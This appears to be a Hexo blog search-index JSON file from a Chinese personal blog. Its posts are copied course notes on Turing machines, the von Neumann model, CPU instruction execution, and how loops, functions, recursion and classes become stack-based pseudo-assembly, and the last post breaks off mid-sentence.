{"meta":{"title":"殇花","subtitle":"殇花思密达","description":"殇花的博客","author":"殇 花","url":"https://www.shanghua.live","root":"/"},"pages":[{"title":"categories","date":"2021-06-20T13:28:52.000Z","updated":"2021-06-20T05:29:03.669Z","comments":true,"path":"categories/index.html","permalink":"https://www.shanghua.live/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-06-20T13:27:36.000Z","updated":"2021-06-20T05:27:54.528Z","comments":true,"path":"tags/index.html","permalink":"https://www.shanghua.live/tags/index.html","excerpt":"","text":""},{"title":"","date":"2021-07-08T04:54:59.481Z","updated":"2021-07-08T04:54:59.481Z","comments":true,"path":"js/demo.js","permalink":"https://www.shanghua.live/js/demo.js","excerpt":"","text":"setTimeout(() => { console.log(\"aaa\"); },0)"}],"posts":[{"title":"递归程序转非递归","slug":"计操/递归程序转非递归","date":"2021-07-15T13:18:45.000Z","updated":"2021-07-15T06:11:48.027Z","comments":true,"path":"2021/07/15/计操/递归程序转非递归/","link":"","permalink":"https://www.shanghua.live/2021/07/15/%E8%AE%A1%E6%93%8D/%E9%80%92%E5%BD%92%E7%A8%8B%E5%BA%8F%E8%BD%AC%E9%9D%9E%E9%80%92%E5%BD%92/","excerpt":"","text":"问题：不支持递归的程序语言，如何实现递归程序？ 首先，它不是纯粹考概念和死记硬背，求职者在回答问题之前需要进行一定的思考 其次，这道题目可以继续深挖，比如可以让求职者具体写一个程序，就变成了一道编程题 最后，这道题目有实战意义，它背后考察的是求职者的编程功底 为了弄清楚这道题目，你需要对程序有一个更深层次的认识，不仅仅停留在指令的执行层面，而是要灵活使用指令，去实现更加复杂的功能。 for 循环如何被执行首先，我们来看 for 循环是如何实现的。下面是一个求 1 加到 100 的 Java 程序，请你思考如何将它转换为指令： 1234var i = 1, s = 0;for(;i &lt;= 100; i++) &#123; s+=i;&#125; 指令是简单的，像积木一样，程序是复杂的，像房子一样。我们将简单的事情组合，然后去完成复杂的事情，这就是程序员每天在做的。在这个过程中，你会产生思考，比如如何排列组合，如何搭积木，才能更快更准地完成项目？所以这也是训练思维的一个过程。 经过思考，如果按照顺序执行上面的程序，则需要很多指令，因为 for 循环可以执行 1 次，也可以执行 100W 次，还可以执行无数次。因此，指令的设计者提供了一种 jump 类型的指令，让你可以在程序间跳跃，比如: 12loop: jump loop 这就实现了一个无限循环，程序执行到 jumploop 的时候，就会跳回 loop 标签。用这种方法，我们可以将 for 循环用底层的指令实现： 1234567891011121314151617181920212223242526272829303132333435363738394041# var i = 1, s = 0# 对应 Java 代码，我们首先将 1 和 0 存储到两个地址# 这两个地址我们用 $i 和 $s 表示store #1 -&gt; $i // 将数字 1 存入i的地址store #0 -&gt; $s // 将数字 0 存入 s 的地址# 接下来循环要开始了，我们在这里预留一个 loop 标签# loop 是一个自定义标签，它代表指令的相对位置# 后续我们可以用 jump 指令跳转回这个位置实现循环loop: # 循环标签# for ... i &lt;= 100# 接下来我们开始实现循环控制# 我们先首先 i &lt;= 100的比较# 我们先将变量 i 的地址，也就是 $i 导入寄存器 R0load $i -&gt; R0# 然后我们用 cmp 比较指令 R0 和数字 100cmp R0 #100 // 比较 R0 和数字 100# 注意指令不会有返回值，它会进行计算，然后改变机器的状态（也就是寄存器）# 比较后，有几个特殊的寄存器会保存比较结果# 然后我们用 ja（jump above）, 如果比较结果 R0 比 100 大# 那么我们就跳转到 end 标签，实现循环的跳出ja endnop# 如果 R0&lt;=100，那么ja end 没有生效，这时我们处理 s+=i# 首先我们把变量 s 所在地址的数据导入寄存器 R1load $s -&gt; R1# 然后我们把寄存器R0和R1加和，把结果存储寄存器 R2add R0 R1 R2# 这时，我们把寄存器 R2 的值存入变量 s 所在的地址store R2 -&gt; $s# 刚才我们完成了一次循环# 我们还需要维护变量 i 的自增# 现在 i 的值在 R0 中，我们首先将整数 1 叠加到 R0 上add R0 #1 R0# 再把 R0 的值存入i所在的内存地址store R0 -&gt; $i# 这时我们的循环体已经全部执行完成，我们需要调转回上面 loop 标签所在的位置# 继续循环jump loopnopend: 通过上面的方法，我们成功将 for 循环的程序转换成了指令，然后再将它们编码成二进制，就可以存储到内存中了。 jump 指令直接操作 PC 指针，但是很多 CPU 会抢先执行下一条指令，因此通常我们在 jump 后面要跟随一条 nop 指令，让 CPU 空转一个周期，避免 jump 下面的指令被执行。是不是到了微观世界，和你所认识的程序还不太一样？ 面我写指令的时候用到了 add/store 这些指令，它们叫作助记符，是帮助你记忆的。整体这段程序，我们就称作汇编程序。 因为不同的机器助记符也不一样，所以你不用太关注我用的是什么汇编语言，也不用去记忆这些指令。当你拿到指定芯片的时候，直接去查阅芯片的说明书就可以了。 虽然不同 CPU 的指令不一样，但也是有行业标准的。现在使用比较多的是 RISC（精简指令集）和 CISC（复杂指令集）。比如目前 Intel 和 AMD 家族主要使用 CISC 指令集，ARM 和 MIPS 等主要使用 RISC 指令集。 条件控制程序条件控制程序有两种典型代表，一种是 if-else ，另一种是 switch-case 。 总体来说， if-else 翻译成指令，是比较简单的，你需要用跳转指令和比较指令处理它的跳转逻辑。 当然，它们的使用场景不同，这块我不展开了。在这里我主要想跟你说说，它们的内部实现是不一样的。if-else 是一个自上向下的执行逻辑， switch-case 是一种精确匹配算法。比如你有 1000 个 case，如果用 if-else 你需要一个个比较，最坏情况下需要比较 999 次；而如果用 switch-case ，就不需要一个个比较，通过算法就可以直接定位到对应的 case 。 举个具体的例子，比如一个根据数字返回星期的程序。如果用 if-else，那么你需要这样做： 123456if(week == 1) &#123; return &quot;周一&quot;;&#125; else if(week == 2) &#123; return &quot;周二&quot;;&#125;…… 如果用 switch-case 的逻辑，你可能会这样计算： 1跳转位置=当前PC + 4*(week * 2 - 1) switch-case 实现更多是依赖数学关系，直接算出 case 所在指令的位置，而不是一行行执行和比较。 函数了解了循环和条件判断，我们再来看看函数是如何被执行的。函数的执行过程必须深入到底层，也会涉及一种叫作栈的数据结构。 下面是一段 C 程序，传入两个参数，然后返回两个参数的和： 123int add(int a, int b)&#123; return a + b;&#125; 通过观察，我们发现函数的参数 a,b 本质是内存中的数据，因此需要给它们分配内存地址。函数返回值也是内存中的数据，也就是返回值也需要分配内存地址。调用函数其实就是跳转到函数体对应的指令所在的位置，因此函数名可以用一个标签，调用时，就用 jump 指令跟这个标签。 比如上面函数进行了 a+b 的运算，我们可以这样构造指令： 12345678# 首先我们定义一个叫作add的标签add:# 然后我们将a和b所在地址中的数据都导入寄存器load $a -&gt; R0load $b -&gt; R1# 然后我们将寄存器求和，并将结果回写到返回地址add R0 R1 R2store R2 -&gt; $r 当我们需要调用这个函数的时候，我们就构造下面这样的指令： 1jump add 细心的同学可能已经发现，这里有 2 个问题还没有解决： 参数如何传递给函数？ 返回值如何传递给调用者？ 为了解决这 2 个问题，我们就需要用到前面提到的一个叫作栈的数据结构。栈的英文是 Stack，意思是码放整齐的一堆东西。首先在调用方，我们将参数传递给栈；然后在函数执行过程中，我们从栈中取出参数。 flowchart LR A[调用] --压栈参数--&gt; B[Stack] B --取出参数--&gt; C[函数执行] 函数执行过程中，先将执行结果写入栈中，然后在返回前把之前压入的参数出栈，调用方再从栈中取出执行结果。 flowchart RL B[Stack] --取出结果--&gt; A[调用] C[函数执行] --写入结果参数出栈--&gt; B 将参数传递给 Stack 的过程，叫作压栈。取出结果的过程，叫作出栈。栈就好像你书桌上的一摞书，压栈就是把参数放到书上面，出栈就是把顶部的书拿下来。 因为栈中的每个数据大小都一样，所以在函数执行的过程中，我们可以通过参数的个数和参数的序号去计算参数在栈中的位置。 接下来我们来看看函数执行的整体过程：假设要计算 11 和 15 的和，我们首先在内存中开辟一块单独的空间，也就是栈。 就如前面所讲，栈的使用方法是不断往上堆数据，所以需要一个栈指针（Stack Pointer， SP）指向栈顶（也就是下一个可以写入的位置）。每次将数据写入栈时，就把数据写到栈指针指向的位置，然后将 SP 的值增加。 为了提高效率，我们通常会用一个特殊的寄存器来存储栈指针，这个寄存器就叫作 Stack Pointer，在大多数芯片中都有这个特殊的寄存器。一开始，SP 指向 0x100 位置，而 0x100 位置还没有数据。 压栈参数 11 接下来我们开始传参，我们先将 11 压栈，之所以称作压栈（Push），就好像我们把数据 11 堆在内存中一样。模拟压栈的过程是下面两条指令： 12store #11 -&gt; $SP // 将11存入SP指向的地址0x100add SP, 4, SP // 栈指针增加4（32位机器） 第一条 store 指令将 SP 寄存器指向的内存地址设置为常数 11。 第二条指令将栈指针自增 4。 这里用美元符号代表将 11 存入的是 SP 寄存器指向的内存地址，这是一次间接寻址。存入后，栈指针不是自增 1 而是自增了 4，因为我在这里给你讲解时，用的是一个 32 位宽的 CPU 。如果是 64 位宽的 CPU，那么栈指针就需要自增 8。 压栈完成后，内存变成下图中所示的样子。11 被写入内存，并且栈指针指向了 0x104 位置。 压栈参数 15 然后我们用同样的方法将参数 15 压栈。 压栈后，11 和 15 都被放入了对应的内存位置，并且栈指针指向了 0x108。 将返回值压栈 接下来，我们将返回值压栈。到这里你可能会问，返回值还没有计算呢，怎么就压栈了？其实这相当于一个占位，后面我们会改写这个地址。 调用函数 当我们完成了上面的压栈后，就开始调用函数，一种简单的做法是用 jump 指令直接跳转到函数的标签，比如： 1jump add 这个时候，要加和在栈中的数据 11 和 15，我们可以利用 SP 指针寻找数据。11 距离当前 SP 指针差 3 个位置，15 距离 SP 指针差 2 个位置。这种寻址方式是一种复合的寻址方式，是间接 + 偏移量寻址。 我们可以用下面的代码完成将 11 和 15 导入寄存器的过程： 12load $(SP - 12) -&gt; R0load $(SP - 8) -&gt; R1 然后进行加和，将结果存入 R2。 1load R0 R1 R2 最后我们可以再次利用数学关系将结果写入返回值所在的位置。 1store R2 -&gt; $(SP-4) 上面我们用到了一种间接寻址的方式来进行加和运算，也就是利用 SP 中的地址做加减法操作内存。经过函数调用的结果如下图所示，运算结果 26 已经被写入了返回值的位置： 发现-解决问题一个好的解决方案，也会面临问题。现在我们就遇到了麻烦： 函数计算完成，这时应该跳转回去。可是我们没有记录函数调用前 PC 指针的位置，因此这里需要改进，我们需要存储函数调用前的 PC 指针方便调用后恢复。 栈不可以被无限使用，11 和 15 作为参数，计算出了结果 26，那么它们就可以清空了。如果用调整栈指针的方式去清空，我们就会先清空 26。此时就会出现顺序问题，因此我们需要调整压栈的顺序。 具体顺序你可以看下图。首先，我们将函数参数和返回值换位，这样在清空数据的时候，就会先清空参数，再清空返回值。 然后我们在调用函数前，还需要将返回地址压栈。这样在函数计算完成前，就能跳转回对应的返回地址。翻译成指令，就是下面这样： 1234567891011121314151617## 压栈返回值add SP, 4 -&gt; SP# 计算返回地址# 我们需要跳转到清理堆栈那行，也就是16行MOV PC+4*(参数个数*2+1) -&gt; SP# 压栈参数的程序……# 执行函数，计算返回值call function# 清理堆栈add SP, -(参数个数+1)*4， SP 递归函数如何被执行我们刚刚使用了栈解决了函数的调用问题。但是这个方案究竟合不合理，还需要用更复杂的情况来验证。 如下所示，我们给出一个递归函数，请你判断是否可以用上面的方法执行： 1234int sum(int n)&#123; if(n == 1) &#123;return 1;&#125; return n + sum(n-1);&#125; 递归的时候，我们每次执行函数都形成一个如下所示的栈结构： 比如执行 sum(100)，我们就会形成一个复杂的栈，第一次调用 n = 100，第二次递归调用 n = 99： 它们堆在了一起，就形成了一个很大的栈，简化一下就是这样的一个模型，如下所示： 到这里，递归消耗了更多空间，但是也保证了中间计算的独立性。当递归执行到 100 次的时候，就会执行下面的语句： 1if(n == 1) &#123;return 1;&#125; 于是触发第 99 次递归执行： 1return 2 + sum(1) // sum(1) = 1 上面程序等价于 return 3，接着再触发第 98 次递归的执行，然后是第 97 次，最终触发到第一次函数调用返回结果。 由此可见，栈这种结构同样适合递归的计算。事实上，计算机编程语言就是用这种结构来实现递归函数。 类型（class）如何实现按照我们之前已经学习到的知识： 变量是一个内存地址，所以只需要分配内存就好了； 循环控制可以用跳转加判断实现； 条件控制也可以用跳转加判断实现，只不过如果是 switch-case 还需要一定的数学计算； 函数调用需要压栈参数、返回值和返回地址。 最后，我们来说说类型是如何实现的，也就是很多语言都支持的 class 如何被翻译成指令。其实 class 实现非常简单，首先一个 class 会分成两个部分，一部分是数据（也称作属性），另一部分是函数（也称作方法）。 class 有一个特殊的方法叫作构造函数，它会为 class 分配内存。构造函数执行的时候，开始扫描类型定义中所有的属性和方法。 如果遇到属性，就为属性分配内存地址； 如果遇到方法，方法本身需要存到正文段（也就是程序所在的内存区域），再将方法的值设置为方法指令所在的内存地址。 当我们调用一个 class 方法的时候，本质上是执行了一个函数，因此和函数调用是一致的： 首先把返回值和返回地址压栈； 然后压栈参数； 最后执行跳转。 这里有一个小问题，有时候 class 的方法会用到 this ，这其实并不复杂，你仔细想想， this 指针不就是构造函数创建的一个指向 class 实例的地址吗？那么，有一种简单的实现，就是我们可以把 this 作为函数的第一个参数压栈。这样，类型的函数就可以访问类型的成员了，而类型也就可以翻译成指令了。 总结 我们写的程序需要翻译成指令才能被执行，，这个翻译工具叫作编译器。 平时你编程做的事情，用机器指令也能做，所以从计算能力上来说它们是等价的，最终这种计算能力又和图灵机是等价的。如果一个语言的能力和图灵机等价，我们就说这个语言是图灵完备的语言。现在市面上的绝大多数语言都是图灵完备的语言，但也有一些不是，比如 HTML、正则表达式和 SQL 等。 我们通过汇编语言构造高级程序；通过高级程序构造自己的业务逻辑，这些都是工程能力的一种体现。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"程序的执行（下）","slug":"计操/程序的执行下","date":"2021-07-14T17:51:42.000Z","updated":"2021-07-15T05:14:09.382Z","comments":true,"path":"2021/07/15/计操/程序的执行下/","link":"","permalink":"https://www.shanghua.live/2021/07/15/%E8%AE%A1%E6%93%8D/%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%89%A7%E8%A1%8C%E4%B8%8B/","excerpt":"","text":"程序的执行过程当 CPU 执行程序的时候： 首先，CPU 读取 PC 指针指向的指令，将它导入指令寄存器。具体来说，完成读取指令这件事情有 3 个步骤： CPU 的控制单元操作地址总线指定需要访问的内存地址（简单理解，就是把 PC 指针中的值拷贝到地址总线中）。 CPU 通知内存设备准备数据（内存设备准备好了，就通过数据总线将数据传送给 CPU）。 CPU 收到内存传来的数据后，将这个数据存入指令寄存器。 完成以上 3 步，CPU 成功读取了 PC 指针指向指令，存入了指令寄存器。 然后，CPU 分析指令寄存器中的指令，确定指令的类型和参数。 如果是计算类型的指令，那么就交给逻辑运算单元计算；如果是存储类型的指令，那么由控制单元执行。 PC 指针自增，并准备获取下一条指令。 比如在 32 位的机器上，指令是 32 位 4 个字节，需要 4 个内存地址存储，因此 PC 指针会自增 4。 详解 a = 11 + 15 的执行过程上面我们了解了基本的程序执行过程，接下来我们来看看如果用冯诺依曼模型执行 a=11+15 是一个怎样的过程。 我们再 Review 下这个问题：程序员写的程序 a=11+15 是字符串，CPU 不能执行字符串，只能执行指令。所以这里需要用到一种特殊的程序——编译器。编译器的核心能力是翻译，它把一种程序翻译成另一种程序语言。 这里，我们需要编译器将程序员写的程序翻译成 CPU 认识的指令（指令我们认为是一种低级语言，我们平时书写的是高级语言）。你可以先跟我完整地学完操作系统，再去深入了解编译原理的内容。 下面我们来详细阐述 a=11+15 的执行过程： 编译器通过分析，发现 11 和 15 是数据，因此编译好的程序启动时，会在内存中开辟出一个专门的区域存这样的常数，这个专门用来存储常数的区域，就是数据段，如下图所示： 11 被存储到了地址 0x100 15 被存储到了地址 0x104 编译器将 a=11+15 转换成了 4 条指令，程序启动后，这些指令被导入了一个专门用来存储指令的区域，也就是正文段。如上图所示，这 4 条指令被存储到了 0x200-0x20c 的区域中： 0x200 位置的 load 指令将地址 0x100 中的数据 11 导入寄存器 R0 0x204 位置的 load 指令将地址 0x104 中的数据 15 导入寄存器 R1 0x208 位置的 add 指令将寄存器 R0 和 R1 中的值相加，存入寄存器 R2 0x20c 位置的 store 指令将寄存器 R2 中的值存回数据区域中的 0x1108 位置 具体执行的时候，PC 指针先指向 0x200 位置，然后依次执行这 4 条指令。 这里还有几个问题要说明一下： 变量 a 实际上是内存中的一个地址，a 是给程序员的助记符。 为什么 0x200 中代表加载数据到寄存器的指令是 0x8c000100，我们会在下面详细讨论。 不知道细心的同学是否发现，在上面的例子中，我们每次操作 4 个地址，也就是 32 位，这是因为我们在用 32 位宽的 CPU 举例。在 32 位宽的 CPU 中，指令也是 32 位的。但是数据可以小于 32 位，比如可以加和两个 8 位的字节。 关于数据段和正文段的内容，会在模块四进程和线程部分继续讲解。 指令在上面的例子中，load 指令将内存中的数据导入寄存器，我们写成了 16 进制：0x8c000100，拆分成二进制就是： 这里大家还是看下图，需要看一下才能明白。 最左边的 6 位，叫作操作码，英文是 OpCode，100011 代表 load 指令 中间的 4 位 0000 是寄存器的编号，这里代表寄存器 R0 后面的 22 位代表要读取的地址，也就是 0x100 所以我们是把操作码、寄存器的编号、要读取的地址合并到了一个 32 位的指令中。 我们再来看一条求加法运算的 add 指令，16 进制表示是 0x08048000，换算成二进制就是： 最左边的 6 位是指令编码，代表指令 add 紧接着的 4 位 0000 代表寄存器 R0 然后再接着的 4 位 0001 代表寄存器 R1 再接着的 4 位 0010 代表寄存器 R2 最后剩下的 14 位没有被使用 构造指令的过程，叫作指令的编码，通常由编译器完成；解析指令的过程，叫作指令的解码，由 CPU 完成。由此可见 CPU 内部有一个循环： 首先 CPU 通过 PC 指针读取对应内存地址的指令，我们将这个步骤叫作 Fetch，就是获取的意思。 CPU 对指令进行解码，我们将这个部分叫作 Decode。 CPU 执行指令，我们将这个部分叫作 Execution。 CPU 将结果存回寄存器或者将寄存器存入内存，我们将这个步骤叫作 Store。 上面 4 个步骤，我们叫作 CPU 的指令周期。CPU 的工作就是一个周期接着一个周期，周而复始。 指令的类型通过上面的例子，你会发现不同类型（不同 OpCode）的指令、参数个数、每个参数的位宽，都不一样。而参数可以是以下这三种类型： 寄存器 内存地址； 数值（一般是整数和浮点） 当然，无论是寄存器、内存地址还是数值，它们都是数字。指令从功能角度来划分，大概有以下 5 类： I/O 类型的指令，比如处理和内存间数据交换的指令 store/load 等；再比如将一个内存地址的数据转移到另一个内存地址的 mov 指令。 计算类型的指令，最多只能处理两个寄存器，比如加减乘除、位运算、比较大小等。 跳转类型的指令，用处就是修改 PC 指针。比如编程中大家经常会遇到需要条件判断+跳转的逻辑，比如 if-else，swtich-case、函数调用等。 信号类型的指令，比如发送中断的指令 trap。 闲置 CPU 的指令 nop，一般 CPU 都有这样一条指令，执行后 CPU 会空转一个周期。 指令还有一个分法，就是寻址模式，比如同样是求和指令，可能会有 2 个版本： 将两个寄存器的值相加的 add 指令。 将一个寄存器和一个整数相加的 addi 指令。 另外，同样是加载内存中的数据到寄存器的 load 指令也有不同的寻址模式： 比如直接加载一个内存地址中的数据到寄存器的指令 la，叫作直接寻址。 直接将一个数值导入寄存器的指令 li，叫作寄存器寻址。 将一个寄存器中的数值作为地址，然后再去加载这个地址中数据的指令 lw，叫作间接寻址。 因此寻址模式是从指令如何获取数据的角度，对指令的一种分类，目的是给编写指令的人更多选择。 关于寻址模式和所有的指令，只要你不是嵌入式开发人员，就不需要记忆，理解即可。 不同 CPU 的指令和寄存器名称都不一样，因此这些名称也不需要你记忆。 有几个寄存器在所有 CPU 里名字都一样，比如 PC 指针、指令寄存器等。 指令的执行速度之前我们提到过 CPU 是用石英晶体产生的脉冲转化为时钟信号驱动的，每一次时钟信号高低电平的转换就是一个周期，我们称为时钟周期。CPU 的主频，说的就是时钟信号的频率。比如一个 1GHz 的 CPU，说的是时钟信号的频率是 1G。 到这里你可能会有疑问：是不是每个时钟周期都可以执行一条指令？其实，不是的，多数指令不能在一个时钟周期完成，通常需要 2 个、4 个、6 个时钟周期。 总结如果说的是 64 位宽 CPU，那么有 2 个优势。 64 位 CPU 可以执行更大数字的运算，这个优势在普通应用上不明显，但是对于数值计算较多的应用就非常明显。 64 位 CPU 可以寻址更大的内存空间 如果 32 位/64 位说的是程序，那么说的是指令是 64 位还是 32 位的。32 位指令在 64 位机器上执行，困难不大，可以兼容。 如果是 64 位指令，在 32 位机器上执行就困难了。因为 32 位指令在 64 位机器执行的时候，需要的是一套兼容机制；但是 64 位指令在 32 位机器上执行，32 位的寄存器都存不下指令的参数。 操作系统也是一种程序，如果是 64 位操作系统，也就是操作系统中程序的指令都是 64 位指令，因此不能安装在 32 位机器上。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"程序的执行（上）","slug":"计操/程序的执行上","date":"2021-07-14T17:20:35.000Z","updated":"2021-07-14T09:51:54.497Z","comments":true,"path":"2021/07/15/计操/程序的执行上/","link":"","permalink":"https://www.shanghua.live/2021/07/15/%E8%AE%A1%E6%93%8D/%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%89%A7%E8%A1%8C%E4%B8%8A/","excerpt":"","text":"面试题：相比 32 位，64 位的优势是什么？ 如果是软件，那么我们的数据库有 32 位和 64 位版本 如果是操作系统，那么选择 centos 和 debian 版本的时候，也会有 32/64 版本 如果是 CPU 那么有 32 位 CPU，也有 64 位 CPU 图灵机的构造 第一，它清楚的定义了计算机能力的边界，也就是可计算理论 第二，它清楚的定义了计算机由哪些部分组成，程序又是如何执行的 图灵机的内部构造 图灵机拥有一条无限长的纸袋，纸袋上是一个格子挨着一个格子，格子中可以写字符，字符可以看作是数据或者程序 图灵机有一个读写头，读写头可以读取任意格子上的字符，也可以改写任意格子的字符 读写头上面的盒子里是一些精密的零件，包括图灵机的存储、控制单元和运算单元 比如我们需要计算 11 加 15 的值 首先，我们将“11、15、+” 分别写入纸带上的 3 个格子（现在纸带上的字符串是11、15、 +)，然后将读写头先停在 11 对应的格子上。 接下来，图灵机通过读写头读入 11 到它的存储设备中（这个存储设备也叫作图灵机的状态）。图灵机没有说读写头为什么可以识别纸带上的字符，而是假定读写头可以做到这点。 然后读写头向右移动一个格，用同样的方法将 15 读入图灵机的状态中。现在图灵机的状态中有两个连续的数字，11 和 15。 接下来重复上面的过程，会读到一个+号。下面我详细说一下这个运算流程： 读写头读到一个 + 号 然后将 + 号传输给控制单元 控制单元发现是一个 + 号，所以没有存入状态中。因为 + 号是一个我们预设的控制符（指令），它的作用是加和目前状态。因此，控制单元识别出是控制符，并通知运算单元工作 运算单元从状态中读入 11、15 并进行计算，将结果 26 存储到状态 运算单元将结果回传给控制单元 控制单元将结果传输给读写头 这样，我们就通过图灵机计算出了 11+15 的值。不知道你有没有发现，图灵机构造的这一台机器，主要功能就是读写纸带然后计算；纸带中有数据、也有控制字符（也就是指令），这个设计和我们今天的计算机是一样的。 图灵通过数学证明了，一个问题如果可以拆解成图灵机的可执行步骤，那问题就是可计算的。另一方面，图灵机定义了计算机的组成以及工作原理，但是没有给出具体的实现。 冯诺依曼模型具体的实现是 1945 年冯诺依曼和其他几位科学家在著名的 101 页报告中提出的。报告遵循了图灵机的设计，并提出用电子元件构造计算机，约定了用二进制进行计算和存储，并且将计算机结构分成以下 5 个部分： 输入设备 输出设备 内存 中央处理器 总线 这个模型也被称为冯诺依曼模型，下面我们具体来看看这 5 部分的作用。 内存在冯诺依曼模型中，程序和数据被存储在一个被称作内存的线性排列存储区域。存储的数据单位是一个二进制位，英文是 bit。最小的存储单位叫作字节，也就是 8 位，英文是 byte，每一个字节都对应一个内存地址。内存地址由 0 开始编号，比如第 1 个地址是 0，第 2 个地址是 1， 然后自增排列，最后一个地址是内存中的字节数减 1。 我们通常说的内存都是随机存取器，也就是读取任何一个地址数据的速度是一样的，写入任何一个地址数据的速度也是一样的。 CPU冯诺依曼模型中 CPU 负责控制和计算。为了方便计算较大的数值，CPU 每次可以计算多个字节的数据。 如果 CPU 每次可以计算 4 个 byte，那么我们称作 32 位 CPU； 如果 CPU 每次可以计算 8 个 byte，那么我们称作 64 位 CPU。 这里的 32 和 64，称作 CPU 的位宽。 为什么 CPU 要这样设计呢？ 因为一个 byte 最大的表示范围就是 0~255。比如要计算 20000*50，就超出了byte 最大的表示范围了。因此，CPU 需要支持多个 byte 一起计算。当然，CPU 位数越大，可以计算的数值就越大。但是在现实生活中不一定需要计算这么大的数值。比如说 32 位 CPU 能计算的最大整数是 4294967295，这已经非常大了。 控制单元和逻辑运算单元CPU 中有一个控制单元专门负责控制 CPU 工作；还有逻辑运算单元专门负责计算。具体的工作原理我们在指令部分给大家分析。 寄存器CPU 要进行计算，比如最简单的加和两个数字时，因为 CPU 离内存太远，所以需要一种离自己近的存储来存储将要被计算的数字。这种存储就是寄存器。寄存器就在 CPU 里，控制单元和逻辑运算单元非常近，因此速度很快。 寄存器中有一部分是可供用户编程用的，比如用来存加和指令的两个参数，是通用寄存器。 还有一部分寄存器有特殊的用途，叫作特殊寄存器。比如程序指针，就是一个特殊寄存器。它存储了 CPU 要执行的下一条指令所在的内存地址。注意，程序指针不是存储了下一条要执行的指令，此时指令还在内存中，程序指针只是存储了下一条指令的地址。 下一条要执行的指令，会从内存读入到另一个特殊的寄存器中，这个寄存器叫作指令寄存器。指令被执行完成之前，指令都存储在这里。 总线CPU 和内存以及其他设备之间，也需要通信，因此我们用一种特殊的设备进行控制，就是总线。总线分成 3 种： 一种是地址总线，专门用来指定 CPU 将要操作的内存地址。 还有一种是数据总线，用来读写内存中的数据。 当 CPU 需要读写内存的时候，先要通过地址总线来指定内存地址，再通过数据总线来传输数据。 最后一种总线叫作控制总线，用来发送和接收关键信号，比如后面我们会学到的中断信号，还有设备复位、就绪等信号，都是通过控制总线传输。同样的，CPU 需要对这些信号进行响应，这也需要控制总线。 输入、输出设备输入设备向计算机输入数据，计算机经过计算，将结果通过输出设备向外界传达。如果输入设备、输出设备想要和 CPU 进行交互，比如说用户按键需要 CPU 响应，这时候就需要用到控制总线。 到这里，相信你已经对冯诺依曼模型的构造有了一定的了解。这里我再强调几个问题： 1. 线路位宽问题第一个问题是，你可能会好奇数据如何通过线路传递。其实是通过操作电压，低电压是 0，高电压是 1。 如果只有一条线路，每次只能传递 1 个信号，因为你必须在 0,1 中选一个。比如你构造高高低低这样的信号，其实就是 1100，相当于你传了一个数字 10 过去。大家注意，这种传递是相当慢的，因为你需要传递 4 次。 这种一个 bit 一个 bit 发送的方式，我们叫作串行。如果希望每次多传一些数据，就需要增加线路，也就是需要并行。 如果只有 1 条地址总线，那每次只能表示 0-1 两种情况，所以只能操作 2 个内存地址；如果有 10 条地址总线，一次就可以表示 210 种情况，也就是可以操作 1024 个内存地址；如果你希望操作 4G 的内存，那么就需要 32 条线，因为 232 是 4G。 到这里，你可能会问，那我串行发送行不行？当然也不是不行，只是速度会很慢，因为每多增加一条线路速度就会翻倍。 2. 64 位和 32 位的计算第二个问题是，CPU 的位宽会对计算造成什么影响？ 我们来看一个具体场景：要用 32 位宽的 CPU，加和两个 64 位的数字。 32 位宽的 CPU 控制 40 位宽的地址总线、数据总线工作会非常麻烦，需要双方制定协议。 因此通常 32 位宽 CPU 最多操作 32 位宽的地址总线和数据总线。 因此必须把两个 64 位数字拆成 2 个 32 位数字来计算，这样就需要一个算法，比如用像小时候做加法竖式一样，先加和两个低位的 32 位数字，算出进位，然后加和两个高位的 32 位数字，最后再加上进位。 而 64 位的 CPU 就可以一次读入 64 位的数字，同时 64 位的 CPU 内部的逻辑计算单元，也支持 64 位的数字进行计算。但是你千万不要仅仅因为位宽的区别，就认为 64 位 CPU 性能比 32 位高很多。 要知道大部分应用不需要计算超过 32 位的数字，比如你做一个电商网站，用户的金额通常是 10 万以下的，而 32 位有符号整数，最大可以到 20 亿。所以这样的计算在 32 位还是 64 位中没有什么区别。 还有一点要注意，32 位宽的 CPU 没办法控制超过 32 位的地址总线、数据总线工作。比如说你有一条 40 位的地址总线（其实就是 40 条线），32 位的 CPU 没有办法一次给 40 个信号，因为它最多只有 32 位的寄存器。因此 32 位宽的 CPU 最多操作 232 个内存地址，也就是 4G 内存地址。 总结关于计算机组成和指令部分，我们就先学到这里。这节课我们通过图灵机和冯诺依曼模型学习了计算机的组成、CPU 的工作原理等。此外，我们还顺带讨论了 32 位和 64 位的区别，现在，你可以回答 64 位和 32 位比较有哪些优势了吗？","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"计算机是什么","slug":"计操/计操入门","date":"2021-07-14T16:48:19.000Z","updated":"2021-07-14T09:00:48.258Z","comments":true,"path":"2021/07/15/计操/计操入门/","link":"","permalink":"https://www.shanghua.live/2021/07/15/%E8%AE%A1%E6%93%8D/%E8%AE%A1%E6%93%8D%E5%85%A5%E9%97%A8/","excerpt":"","text":"还是直接复制教程文章方便，文章来源自拉勾教育林䭽老师的重学操作系统课程 我记得自己在面试中遇到过这样一个问题：“可不可以计算一个人程序写得好不好？” 当时我也没有想明白“计算”这个词是什么意思。但事后分析来看，“计算”不就是写程序吗？ 其实简单理解这个问题就是“可不可以用机器来判断人的程序写得好不好？”如果从这个角度考虑，我是可以和面试官论述一番的。 后面我查阅了资料，历史上有一个对计算机领域影响颇深的可计算理论，面试官说的“计算”应该就来源于这里。其实继续深挖还能找出很多涉及计算机本源的有趣的知识，比如图灵机、冯诺依曼模型；再比如说 CPU 的构成、程序如何执行、缓存的分级、总线的作用等。 上面提到的这些内容其实都属于操作系统的前置课程，我会利用第一章 4 个课时和大家探讨一下计算机组成原理，然后我们再正式进入操作系统的学习。其实学习就是这样，追溯源头，回到本质，才能挖掘兴趣、激发思考，否则就变成了死记硬背。接下来我们将从计算能源的角度入手，来展开今天的课程学习。 芯片：计算能源我们知道第一次工业革命出现了蒸汽机，能源是煤炭。第二次工业革命出现了发电机，能源是电。20 